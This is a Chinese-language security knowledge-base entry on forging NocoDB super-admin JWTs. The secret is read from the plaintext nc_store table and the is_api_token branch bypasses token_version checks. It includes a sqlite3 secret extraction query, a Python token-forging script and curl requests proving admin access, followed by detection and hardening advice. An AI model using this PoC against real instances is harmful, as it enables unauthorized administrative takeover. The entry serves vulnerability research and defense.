---
id: web-generic-jwt-nocodb-store-secret-is-api-token-forgery
title: NocoDB JWT 密钥明文存 nc_store + is_api_token 旁路 token_version：伪造 super-admin Token
type: scenario
domain: web
path: web/generic/jwt
technique: nocodb-jwt-secret-store-is-api-token-bypass
tags:
- nocodb
- jwt
- hmac
- is-api-token
- token-version
- secret-leak
- forge
- nodejs
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: NocoDB 2026.07.0（Docker latest，原文测试版本）
verification:
  verified_by: verifier-V66
  verified_at: '2026-11-05T12:34:06+08:00'
  notes: 已对照原文与图12-14核对：nc_store 表 key=nc_auth_jwt_secret 值为 UUID 36361e58-321d-4198-a204-6e5341e73f82（明文、uuidv4 首次生成后复用）；Noco.initJwt 读取/写入逻辑一致；JwtStrategy 在 is_api_token 为真时直接返回 payload、跳过用户查询与 token_version；用该密钥 HS256 签发 roles=super-admin,org-level-creator + is_api_token:true 的 JWT，/auth/user/me 返回 isAuthorized:true（用户不在库中），并可调用上传接口；均与原文/图一致。affected_versions 2026.07.0 为原文测试版本，保留；未在本机复现。
url: /docs/web/generic/jwt/web-generic-jwt-nocodb-store-secret-is-api-token-forgery/
draft: false
kb_aliases:
- NocoDB JWT 伪造
- nc_auth_jwt_secret
- is_api_token 绕过
- token_version 旁路
- NocoDB 管理员 Token
- nc_store 密钥
---

## 一句话结论

NocoDB 首次启动时用 `uuidv4()` 生成 JWT 的 HS256 密钥并明文存入 SQLite 的 `nc_store` 表（key=`nc_auth_jwt_secret`），且 `JwtStrategy.validate` 在 payload 带 `is_api_token: true` 时直接返回 payload、跳过用户查询与 `token_version` 校验；能读取数据库文件的攻击者即可用该密钥签发带 `roles: super-admin` 的伪造 Token，以不存在的用户身份获得管理员权限。

## 原理

- `Noco.initJwt()` 在未配置 `NC_AUTH_JWT_SECRET` 时，从 `nc_store` 读 `nc_auth_jwt_secret`；不存在则 `uuidv4()` 生成并 `metaInsert2` 写入，之后一直复用，不轮换、不加密。
- JWT 使用 HS256，签名密钥就是该 UUID；拿到密钥即可对任意 payload 计算合法签名。
- `JwtStrategy.validate` 的逻辑：

  ```js
  if (!jwtPayload?.email || jwtPayload?.is_api_token || jwtPayload?.is_oauth_token)
      return jwtPayload;
  const user = await User.getByEmail(jwtPayload?.email);
  if (!user) NcError.unauthorized('Token Expired...');
  if (user.token_version !== jwtPayload.token_version)
      NcError.unauthorized('Token Expired. Please login again.');
  ```

  只要 `is_api_token` 为真，直接返回攻击者可控的 payload，不查库、不比对 `token_version`，因此可以伪造数据库中不存在的用户与任意角色。
- `token_version` 本是登出/改密后使旧 Token 失效的机制，但被 API Token 分支旁路；两个由不同时间/开发者加入的逻辑组合形成设计间隙。
- 默认 Token 有效期 10 小时；伪造时 `iat`/`exp` 可自行指定，只要签名正确。

## 触发条件

- 攻击者能读取 NocoDB 的 SQLite 数据库文件（备份泄露、容器逃逸、共享存储、路径穿越、运维误公开等）。
- 实例使用默认密钥存储方式（未设置 `NC_AUTH_JWT_SECRET` 环境变量）。
- 目标未对 `is_api_token` 分支做额外校验或降权。
- 伪造 Token 通过 `xc-auth` 头或 `nc_token` Cookie 提交。

## 利用步骤

1. 获取 `noco.db`（默认 `/usr/app/data/noco.db`），查询 `nc_store`：
   `SELECT value FROM nc_store WHERE key='nc_auth_jwt_secret';`
2. 用该值作为 HS256 密钥，构造 payload：任意 `email`/`id`、`roles: super-admin,org-level-creator`、`is_api_token: true`、自选 `iat`/`exp`。
3. 用 PyJWT `jwt.encode(payload, secret, algorithm='HS256')` 生成 Token。
4. 请求 `/api/v1/auth/user/me`，确认返回 `super-admin` 且 `isAuthorized: true`（响应中没有 `email_verified`，用户不存在于数据库）。
5. 用该 Token 调用需要 SUPER_ADMIN 的接口（如上传、用户管理、实例设置），验证权限。

## PoC

```bash
# 1. 读取密钥（需已获得数据库文件）
sqlite3 noco.db "SELECT * FROM nc_store WHERE key = 'nc_auth_jwt_secret';"
# 2|...|db|nc_auth_jwt_secret|36361e58-321d-4198-a204-6e5341e73f82
```

```python
import jwt, time
secret = '36361e58-321d-4198-a204-6e5341e73f82'
now = int(time.time())
payload = {
    'email': 'admin@nocodb.com',
    'id': 'us_forged_admin_001',
    'display_name': 'Forged Admin',
    'roles': 'super-admin,org-level-creator',
    'is_api_token': True,   # 绕过 token_version 校验
    'iat': now,
    'exp': now + 36000,
}
print(jwt.encode(payload, secret, algorithm='HS256'))
```

```bash
# 2. 验证
curl -s http://target:8080/api/v1/auth/user/me -H "xc-auth: <伪造JWT>"
# {"email":"admin@nocodb.com","roles":{"super-admin":true,...},"is_api_token":true,"isAuthorized":true}

# 3. 以管理员身份上传
echo 'forged by admin' > forged.txt
curl -s -X POST http://target:8080/api/v1/db/storage/upload \
  -H "xc-auth: <伪造JWT>" -F "file=@forged.txt"
```

## 变体与关联

- **密钥来源**：数据库备份、容器卷、共享存储、路径穿越/任意文件读取、`docker cp`；也可由运维泄露的 `NC_AUTH_JWT_SECRET` 环境变量直接获得。
- **不轮换**：密钥只在首次启动生成，泄露后长期有效；即使修改用户密码/登出，伪造 Token 也不受 `token_version` 影响。
- **其他 JWT 产品**：n8n 的 encryptionKey 派生 JWT 密钥、示例配置硬编码 secret 等同类问题；核心都是“签名密钥可读 + 校验分支可绕过”。
- **关联**：[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]（读配置/数据库伪造 admin）、[[web-generic-jwt-example-config-hardcoded-secret]]（默认密钥伪造）、[[web-generic-auth-nocodb-open-signup-first-user-superadmin]]（无需读库的另一种管理员路径）。

## 检测与防御

- 通过环境变量 `NC_AUTH_JWT_SECRET` 注入高强度随机密钥，不落库、不入备份；定期轮换使旧 Token 失效。
- 修复 `JwtStrategy`：`is_api_token` 分支也必须校验 `token_version` 与用户存在性，禁止从 Token 直接信任 `roles`；API Token 应映射到真实用户并降权。
- 保护 `noco.db`：容器卷权限最小化，禁止备份/共享存储公开，数据库文件加密或使用外部数据库并限制访问。
- 检测：JWT payload 含 `is_api_token: true` 且 `email` 不在用户库；同一 `id`/`email` 的异常 Token；数据库文件异常读取；管理员接口调用来源 IP 异常。
